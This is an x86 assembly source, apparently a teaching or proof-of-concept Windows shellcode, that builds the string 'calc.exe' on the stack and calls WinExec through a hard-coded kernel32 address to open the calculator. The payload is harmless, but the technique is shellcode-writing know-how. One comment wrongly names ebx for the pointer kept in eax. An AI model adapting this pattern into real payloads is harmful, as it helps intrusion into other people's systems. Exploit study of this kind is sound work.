.intel_syntax noprefix
.global _start
_start:
         xor  ecx, ecx         # zero out ecx
         push ecx                # string terminator 0x00 for "calc.exe" string
         push 0x6578652e       # exe. : 6578652e
         push 0x636c6163       # clac : 636c6163
         
         mov  eax, esp         # save pointer to "calc.exe" string in ebx
         
         # UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT   uCmdShow)#
         inc  ecx              # uCmdShow = 1
         push ecx              # uCmdShow *ptr to stack in 2nd position - LIFO
         push eax              # lpcmdLine *ptr to stack in 1st position
         mov  ebx, 0x76f0e5fd  # call WinExec() function addr in kernel32.dll
         call ebx
